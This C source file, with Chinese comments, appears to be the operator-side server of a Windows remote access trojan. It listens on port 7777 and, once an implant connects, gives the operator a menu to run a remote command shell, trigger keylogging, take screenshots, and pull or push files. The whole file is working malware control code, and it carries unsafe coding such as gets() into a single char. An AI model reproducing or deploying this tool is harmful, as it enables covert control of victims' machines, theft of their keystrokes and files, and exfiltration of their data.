#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <WinSock2.h> 
  
#define PORT 7777 
#define SERVER_IP "127.0.0.1" 
#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512
#pragma comment(lib, "WS2_32") 

void sendFile(SOCKET m_New_Socket); 
void recvFile(SOCKET m_New_Socket); 
void recvCMD(SOCKET m_New_Socket);
int main() 
{ 
  char Options[] = "Please input number c:CMD k:KeyLog s:sendFiles r:recvFiles p:PtrSc e:exit\n";
  // 声明并初始化一个服务端(本地)的地址结构 
  sockaddr_in server_addr; 
  server_addr.sin_family = AF_INET; 
  server_addr.sin_addr.S_un.S_addr = INADDR_ANY; 
  server_addr.sin_port = htons(PORT); 
  
  // 初始化socket dll 
  WSADATA wsaData; 
  WORD socketVersion = MAKEWORD(2, 0); 
  if(WSAStartup(socketVersion, &wsaData) != 0) 
  { 
    printf("Init socket dll error!"); 
    exit(1); 
  } 
  
  // 创建socket 
  SOCKET m_Socket = socket(AF_INET, SOCK_STREAM, 0); 
    if (SOCKET_ERROR == m_Socket) 
    { 
      printf("Create Socket Error!"); 
    exit(1); 
    } 
  
  //绑定socket和服务端(本地)地址 
  if (SOCKET_ERROR == bind(m_Socket, (LPSOCKADDR)&server_addr, sizeof(server_addr))) 
  { 
    printf("Server Bind Failed: %d", WSAGetLastError()); 
    exit(1); 
  } 
  
  //监听 
  if (SOCKET_ERROR == listen(m_Socket, 10)) 
  { 
    printf("Server Listen Failed: %d", WSAGetLastError()); 
    exit(1); 
  } 
  
	
  	char buffer[BUFFER_SIZE]; //接受的字符
	char c;//选择
	char comd[5] = {0}; //输出命令
  
  while(1) 
  { 
    printf("Listening To Server...\n"); 
  
    sockaddr_in client_addr; 
    int client_addr_len = sizeof(client_addr); 
  
    SOCKET m_New_Socket = accept(m_Socket, (sockaddr *)&client_addr, &client_addr_len); 
    if (SOCKET_ERROR == m_New_Socket) 
    { 
      printf("Server Accept Failed: %d", WSAGetLastError()); 
      break; 
    } 
	
	recv(m_New_Socket, buffer, sizeof(buffer),0);//判断是否成功
	printf("%s",buffer);
	memset(buffer,0, BUFFER_SIZE);
	
	printf("%s", Options);  //输出选择
	gets(&c);
	if( c != NULL )
	{
		if(c=='s'){
			sendFile(m_New_Socket);
			closesocket(m_New_Socket);
		}
		else if(c=='r'){
			recvFile(m_New_Socket);
			closesocket(m_New_Socket);
		}
		else if(c == 'e'){
			comd[0] = c;
			send(m_New_Socket,comd,5,0);
			recv(m_New_Socket, buffer, sizeof(buffer),0);
			printf("%s",buffer);
			memset(buffer,0, BUFFER_SIZE);
			//break;
		}
		else if(c == 'k'){
			comd[0] = c;	
			send(m_New_Socket,comd,5,0);		
			printf("10 secd or 30 Keylog will exit!\n");
			//scanf("%c",&comd[0]);
			recv(m_New_Socket, buffer, sizeof(buffer),0);
			printf("%s",buffer);	
			memset(buffer,0, BUFFER_SIZE);
			closesocket(m_New_Socket);
		}
		else if(c == 'p'){
			comd[0] = c;
			char PtrScnum[5] ={0};
			send(m_New_Socket,comd,5,0);
			recv(m_New_Socket, buffer, sizeof(buffer),0);
			printf("%s",buffer);
			memset(buffer,0, BUFFER_SIZE);
			//scanf("%s",&PtrScnum);
			//printf("%s\n",PtrScnum);
			//send(m_New_Socket, PtrScnum, 5,0);
			closesocket(m_New_Socket);
		}
		else if(c == 'c'){
			comd[0] = c;	
			send(m_New_Socket,comd,5,0);
			recvCMD(m_New_Socket);
			//recv(m_New_Socket, buffer, sizeof(buffer),0);
			//printf("%s",buffer);
			memset(buffer,0, BUFFER_SIZE);
		}
		else{
			printf("the Choice is wrong, input again!\n");
			closesocket(m_New_Socket);
		}
		//gets(&c);
	}
	

 } 
  
  closesocket(m_Socket); 
  //释放winsock库 
  WSACleanup(); 
  return 0; 
} 

void recvCMD(SOCKET c_Socket){
	char comdbuf[100] = {0};
	char rbuf[1024] = {0};
	printf("CMD is beigining, quit to exit:\n");
//	recv(c_Socket, rbuf, sizeof(rbuf),0 );
	while(1){
		scanf("%s",comdbuf);
		send(c_Socket, comdbuf, sizeof(comdbuf),0 );
		if(strnicmp(comdbuf, "quit", 4) == 0)
		{
			break;
		}
		recv(c_Socket, rbuf, sizeof(rbuf),0 );
		printf("%s",rbuf);
		memset(rbuf,0, sizeof(rbuf));
		memset(comdbuf, 0, sizeof(comdbuf));
	}
}

void recvFile(SOCKET c_Socket){
  //输入文件名 
  char bufferr[5]; 
  memset(bufferr, 0, 1);
  bufferr[0]='r';
  send(c_Socket, bufferr, 5, 0);
  char file_name[FILE_NAME_MAX_SIZE+1]; 
  char filename[FILE_NAME_MAX_SIZE+1]; 
  memset(file_name, 0, FILE_NAME_MAX_SIZE+1); 
  memset(filename, 0, FILE_NAME_MAX_SIZE+1); 
  printf("Please Input File Name On Server: "); 
  scanf("%s", &file_name); 
  printf("Please Input File Name On Client: "); 
  scanf("%s", &filename); 
  
  char buffer[BUFFER_SIZE]; 
  memset(buffer, 0, BUFFER_SIZE); 
  strncpy(buffer, file_name, strlen(file_name)>BUFFER_SIZE ? BUFFER_SIZE:strlen(file_name)); 
  
  //向服务器发送文件名 
  if(send(c_Socket, buffer, BUFFER_SIZE, 0) < 0) 
  { 
    printf("Send File Name Failed\n"); 
  //  system("pause"); 
  //  exit(1); 
  } 
  
  //打开文件，准备写入 
  FILE * fp = fopen(filename, "wb"); //windows下是"wb",表示打开一个只写的二进制文件 
  if(NULL == fp) 
  { 
    printf("File: %s Can Not Open To Write\n", file_name); 
  //  system("pause"); 
  //  exit(1); 
  } 
  else
  { 
    memset(buffer, 0, BUFFER_SIZE); 
    int length = 0; 
    while ((length = recv(c_Socket, buffer, BUFFER_SIZE, 0)) > 0) 
    { 
      if (fwrite(buffer, sizeof(char), length, fp) < 1024) 
      { 
        printf("File: %s Write Failed\n", file_name); 
        break; 
      } 
      memset(buffer, 0, BUFFER_SIZE); 
    } 
  
    printf("Receive File: %s From Server Successful!\n", file_name); 
  } 
  
  fclose(fp); 
}

void sendFile(SOCKET c_Socket){
	char bufferr[5]; 
    memset(bufferr, 0, 1);
	bufferr[0]='s';
	send(c_Socket, bufferr, 5, 0);
  char file_name[FILE_NAME_MAX_SIZE+1]; 
  char filename[FILE_NAME_MAX_SIZE+1]; 
  memset(file_name, 0, FILE_NAME_MAX_SIZE+1); 
  memset(filename, 0, FILE_NAME_MAX_SIZE+1); 
  printf("Please Input File Name On Client: "); 
  scanf("%s", &file_name); 
  printf("Please Input File Name On Server(new filename): "); 
  scanf("%s", &filename); 
  char buffer[BUFFER_SIZE]; 
  memset(buffer, 0, BUFFER_SIZE); 
  strncpy(buffer, filename, strlen(filename)>BUFFER_SIZE ? BUFFER_SIZE:strlen(filename)); 
  
  //向服务器发送文件名 
  if(send(c_Socket, buffer, BUFFER_SIZE, 0) < 0) 
  { 
    printf("Send File Name Failed\n"); 
	return;
   // system("pause"); 
  //  exit(1); 
  } 
   FILE * fp = fopen(file_name, "rb"); //windows下是"rb",表示打开一个只读的二进制文件 
    if (NULL == fp) 
    { 
      printf("File: %s Not Found\n", file_name); 
	  //system("pause"); 
      //exit(1); 
	  return;
    } 
        else
    { 
      memset(buffer, 0, BUFFER_SIZE); 
      int length = 0; 
  
      while ((length = fread(buffer, sizeof(char), BUFFER_SIZE, fp)) > 0) 
      { 
        if (send(c_Socket, buffer, length, 0) < 0) 
        { 
          printf("Send File: %s Failed\n", file_name); 
	//	  system("pause"); 
	//	  exit(1);
		  return;
        } 
        memset(buffer, 0, BUFFER_SIZE); 
      } 
  
      fclose(fp); 
      printf("File: %s Transfer Successful!\n", file_name); 
		}

}

//void()